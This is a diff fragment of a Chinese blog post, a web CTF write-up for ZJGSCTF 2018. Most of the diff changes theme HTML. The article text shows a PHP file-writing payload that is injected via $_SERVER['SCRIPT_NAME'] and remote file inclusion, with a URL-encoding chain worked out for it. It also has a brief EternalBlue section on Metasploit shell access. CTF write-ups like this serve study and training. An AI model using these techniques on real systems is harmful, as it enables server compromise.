+<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>由于我们需要看到php执行的结果，把结果写入test.php文件夹中。<br>构造php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fwrite(fopen(<span class="string">'test.php'</span>,<span class="string">'w+'</span>),<span class="string">"&lt;?php var_dump(glob('*'));?&gt;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>第二，由于上面我们发现<strong>$_SERVER[‘SCPIPT_NAME’]</strong>注入php代码，需要保证php代码URL编码一次<br>计算我们此处payload需要URL编码的次数，顺便理清楚执行过程</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">输入框内编码x次 加上 发送浏览器自动编码<span class="number">1</span>次 </div><div class="line">减去 服务器接受自动解码<span class="number">1</span>次 </div><div class="line">admin用户页面查看view页面 数据提取出数据库，原样显示到view.php页面形成图片</div><div class="line">加上 admin用户在view.php通过浏览器自动访问 服务器/admin/index.php?path=xx 页面 发送浏览器自动编码<span class="number">1</span>次</div><div class="line">减去 服务器接受请求自动解码<span class="number">1</span>次</div><div class="line">因为PATH参数 远程<span class="keyword">include</span> http:<span class="comment">//localhost/index.php/xxxxxx  #此处的xxx需要剩2次编码</span></div><div class="line">服务器 远程请求 服务器自己 </div><div class="line">减去 服务器接受自动解码<span class="number">1</span>次 </div><div class="line">$_SERVER[<span class="string">'SCPIPT_NAME'</span>] 需要保证URL编码<span class="number">1</span>次</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入框内编码x次 加上 发送浏览器自动编码<span class="number">1</span>次 </span><br><span class="line">减去 服务器接受自动解码<span class="number">1</span>次 </span><br><span class="line">admin用户页面查看view页面 数据提取出数据库，原样显示到view.php页面形成图片</span><br><span class="line">加上 admin用户在view.php通过浏览器自动访问 服务器/admin/index.php?path=xx 页面 发送浏览器自动编码<span class="number">1</span>次</span><br><span class="line">减去 服务器接受请求自动解码<span class="number">1</span>次</span><br><span class="line">因为PATH参数 远程<span class="keyword">include</span> http:<span class="comment">//localhost/index.php/xxxxxx  #此处的xxx需要剩2次编码</span></span><br><span class="line">服务器 远程请求 服务器自己 </span><br><span class="line">减去 服务器接受自动解码<span class="number">1</span>次 </span><br><span class="line">$_SERVER[<span class="string">'SCPIPT_NAME'</span>] 需要保证URL编码<span class="number">1</span>次</span><br></pre></td></tr></table></figure>
 <p>所以得出 在输入框内 需要对php内容进行2次编码</p>
 <p><strong>构造payload</strong></p>
 <blockquote>
@@ -464,218 +296,153 @@
 <p>那如果admin用户是在服务端的浏览器查看的，可不可以呢，也是不可以的。<br>include 远程文件 是不能包含cookie的</p>
 <h2 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h2><p>以下writeup来自betamao:</p>
 <h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><p>使用nmap扫描发现开了443端口，为windows服务器，还开了明显被永恒之蓝入侵的端口：</p>
-<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fr57hg3d27j30w00bswg6.jpg" alt=""><br></div>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fr57hg3d27j30w00bswg6.jpg" alt><br></div>
 
 <h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>使用metasploit扫描果然存在漏洞：</p>
-<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fr57huj9wij314f084q2y.jpg" alt=""><br></div>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fr57huj9wij314f084q2y.jpg" alt><br></div>
 
 <p>直接攻击得到shell</p>
-<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fr57is68agj30zt0irjrs.jpg" alt=""><br></div>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fr57is68agj30zt0irjrs.jpg" alt><br></div>
 
 <h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>太特喵的累了….把能想到的问题一一尝试，全部解决了….也算是把白猪老哥的题弄清楚了….花了好长好长时间呜呜,溜了溜了qaq</p>
 
-      
-    </div>
-    
   </div>
-  
-    
-    <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/05/06/ZJGSCTF-2018-writeup/">ZJGSCTF-2018-web writup</a></p>
-        <p><span>文章作者:</span><a href="/" title="回到主页">LaLa</a></p>
-        <p><span>发布时间:</span>2018-05-06, 12:39:54</p>
-        <p><span>最后更新:</span>2018-06-22, 21:28:29</p>
-        <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/05/06/ZJGSCTF-2018-writeup/" title="ZJGSCTF-2018-web writup">http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/　　作者: LaLa" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
-            <script> var clipboard = new Clipboard('.copy-path'); </script>
-        </p>
-        <p>
-            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
-        </p>
-    </div>
-
-
-
-    <nav id="article-nav">
-        
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/05/11/mysql-字符集漏洞/">
-                    Mysql-字符集漏洞分析
-                </a>
-            </div>
-        
-        
-            <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/04/27/WEB-RPO攻击/">
-                    WEB-RPO攻击
-                </a>
-            </div>
-        
-    </nav>
-
-  
 </article>
 
-    <div id="toc" class="toc-article">
-        <strong class="toc-title">文章目录</strong>
-        
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#给你的小世界"><span class="toc-text">给你的小世界</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#工商交友平台"><span class="toc-text">工商交友平台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#奇淫技巧"><span class="toc-text">奇淫技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#猜测-include-On"><span class="toc-text">猜测 include=On</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜测-fopen-On-include-On"><span class="toc-text">猜测 fopen=On include=On</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小姐姐小姐姐，你听我说噢"><span class="toc-text">小姐姐小姐姐，你听我说噢</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#admin-view-php"><span class="toc-text">admin/view.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SERVER-‘SCRIPT-NAME’-漏洞"><span class="toc-text">$_SERVER[‘SCRIPT_NAME’]漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程文件包含"><span class="toc-text">远程文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#组合所有漏洞"><span class="toc-text">组合所有漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造payload"><span class="toc-text">构造payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关于webshell-payload的细节分析"><span class="toc-text">关于webshell-payload的细节分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#view-php的XSS攻击-为何与-include无法结合"><span class="toc-text">view.php的XSS攻击 为何与 include无法结合</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#永恒之蓝"><span class="toc-text">永恒之蓝</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#发现"><span class="toc-text">发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击"><span class="toc-text">攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后言"><span class="toc-text">后言</span></a></li></ol>
-        
-    </div>
-    <style>
-        .left-col .switch-btn,
-        .left-col .switch-area {
-            display: none;
-        }
-        .toc-level-3 i,
-        .toc-level-3 ol {
-            display: none !important;
-        }
-    </style>
-
-    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
-
-    <script>
-        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
-    </script>
-
-
-
-
-
-    
-
-
-
-
-    <div class="scroll" id="post-nav-button">
-        
-            <a href="/2018/05/11/mysql-字符集漏洞/" title="上一篇: Mysql-字符集漏洞分析">
-                <i class="fa fa-angle-left"></i>
-            </a>
-        
-
-        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
-
-        
-            <a href="/2018/04/27/WEB-RPO攻击/" title="下一篇: WEB-RPO攻击">
-                <i class="fa fa-angle-right"></i>
-            </a>
-        
-    </div>
-
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/09/26/Tools-nmap/">Tools-nmap使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/15/0day-NEO智能合约平台Runtime.Notify()调用拒绝服务漏洞/">0day-NEO智能合约平台Runtime.Notify调用拒绝服务漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/29/智能合约安全-重入攻击/">智能合约安全-重入攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/25/浏览器渲染原理与编码解码/">浏览器渲染原理与编码解码</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/15/NEO-搭建私有链/">NEO-搭建私有链</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/13/NEO-JAVA环境/">NEO-智能合约JAVA c#环境</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/07/DAPP开发中趟过的坑/">DAPP开发中趟过的坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/07/truffle_contact/">Truffle-Contract中间件</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/07/truffle/">Truffle框架</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/11/Vue组件/">Vue-组件</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/11/Vue/">Vue-基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/11/mysql-字符集漏洞/">Mysql-字符集漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/06/ZJGSCTF-2018-writeup/">ZJGSCTF-2018-web writup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/27/WEB-RPO攻击/">WEB-RPO攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/23/Ubuntu下Apache2、Mysql、php7搭建/">Ubuntu下Apache2、Mysql、php7搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/21/docker/">Docker使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/09/WEB-SQL报错注入/">WEB-SQL报错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/03/web-phpinfo包含临时文件/">WEB-基于phpinfo的包含临时文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/26/WEB-网强杯 WEB writeup/">WEB-网强杯-WEB-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/19/WEB-LFI与RFI利用/">WEB-LFI与RFI利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/WEB-PHP核心配置/">WEB-PHP核心配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/26/WEB-Cookie注入与伪静态注入/">WEB-Cookie注入与伪静态注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/30/WEB-HTTP基础/">WEB-HTTP基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/25/python笔记/">python2.7笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与交易/">比特币&区块链与交易</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与挖矿/">比特币&区块链与挖矿</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/05/WEB-CTF中的SQL文件操作/">WEB-CTF中的SQL文件操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/19/WEB-CTF中的绕过/">WEB-CTF中的绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/WEB-CTF中的sql盲注/">WEB-CTF中的sql盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/ZJGSCTF_writeup/">ZJGSCTF-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/WEB-CTF中的SQL注入/">WEB-CTF中的SQL注入</a></li></ul>
-
-
-
-
-    <script>
-        
-    </script>
-</div>
-      <footer id="footer">
-    <div class="outer">
-        <div id="footer-info">
-            <div class="footer-left">
-                <i class="fa fa-copyright"></i> 
-                2017-2018 LaLa
-            </div>
-            <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
-            </div>
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
         </div>
-        
-            <div class="visit">
-                
-                    <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
-                        </span>
-                    </span>
-                
-                
-                    <span>| </span>
-                
-                
-                    <span id="busuanzi_container_page_pv" style='display:none'>
-                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
-                        </span>
-                    </span>
-                
-            </div>
-        
     </div>
-</footer>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/friends/">友链</a></li>
+        
+      </ul>
     </div>
-    
-<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
 
-    <script>
-        $(document).ready(function() {
-            var iPad = window.navigator.userAgent.indexOf('iPad');
-            if (iPad > -1 || $(".left-col").css("display") === "none") {
-                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
-                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
-                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
-            }
-            else {
-                var backgroundnum = 5;
-                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
-                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
-            }
-        })
-    </script>
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#给你的小世界"><span class="toc-number">1.</span> <span class="toc-text">给你的小世界</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#工商交友平台"><span class="toc-number">2.</span> <span class="toc-text">工商交友平台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#奇淫技巧"><span class="toc-number">3.</span> <span class="toc-text">奇淫技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#猜测-include-On"><span class="toc-number">3.1.</span> <span class="toc-text">猜测 include=On</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#猜测-fopen-On-include-On"><span class="toc-number">3.2.</span> <span class="toc-text">猜测 fopen=On include=On</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小姐姐小姐姐，你听我说噢"><span class="toc-number">4.</span> <span class="toc-text">小姐姐小姐姐，你听我说噢</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#admin-view-php"><span class="toc-number">4.1.</span> <span class="toc-text">admin/view.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SERVER-‘SCRIPT-NAME’-漏洞"><span class="toc-number">4.2.</span> <span class="toc-text">$_SERVER[‘SCRIPT_NAME’]漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程文件包含"><span class="toc-number">4.3.</span> <span class="toc-text">远程文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#组合所有漏洞"><span class="toc-number">4.4.</span> <span class="toc-text">组合所有漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造payload"><span class="toc-number">4.5.</span> <span class="toc-text">构造payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关于webshell-payload的细节分析"><span class="toc-number">4.6.</span> <span class="toc-text">关于webshell-payload的细节分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#view-php的XSS攻击-为何与-include无法结合"><span class="toc-number">4.7.</span> <span class="toc-text">view.php的XSS攻击 为何与 include无法结合</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#永恒之蓝"><span class="toc-number">5.</span> <span class="toc-text">永恒之蓝</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#发现"><span class="toc-number">5.1.</span> <span class="toc-text">发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击"><span class="toc-number">5.2.</span> <span class="toc-text">攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后言"><span class="toc-number">6.</span> <span class="toc-text">后言</span></a></li></ol>
+    </div>
 
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/&text=ZJGSCTF-2018-web writup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/&title=ZJGSCTF-2018-web writup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/&is_video=false&description=ZJGSCTF-2018-web writup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ZJGSCTF-2018-web writup&body=Check out this article: http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/&title=ZJGSCTF-2018-web writup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/&title=ZJGSCTF-2018-web writup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/&title=ZJGSCTF-2018-web writup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/&title=ZJGSCTF-2018-web writup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lalajun.com/2018/05/06/ZJGSCTF-2018-writeup/&name=ZJGSCTF-2018-web writup&description=&lt;p&gt;— ZJGSCTF 2018 —&lt;br&gt;—  web writeup —&lt;br&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
 
+    </div>
 
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
 
-
-<div class="scroll" id="scroll">
-    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
-    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
-    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
-</div>
-<script>
-    // Open in New Window
-    
-        var oOpenInNew = {
-            
-            
-             post: ".article-entry a[href], .copyright a[href]", 
-            
-            
-            
-             archives: ".archive-article-title", 
-             miniArchives: "a.post-list-link", 
-            
-             friends: "#js-friends a", 
-             socail: ".social a" 
-        }
-        for (var x in oOpenInNew) {
-            $(oOpenInNew[x]).attr("target", "_blank");
-        }
-    
-</script>
-
-    <script>
-        var originTitle = document.title;
-        var titleTime;
-        document.addEventListener("visibilitychange", function() {
-            if (document.hidden) {
-                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
-                clearTimeout(titleTime);
-            }
-            else {
-                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
-                titleTime = setTimeout(function() {
-                    document.title = originTitle;
-                }, 2000);
-            }
-        })
-    </script>
-
-<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
-</script>
   </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 LaLa
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/friends/">友链</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'lalajun';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
 </body>
 </html>
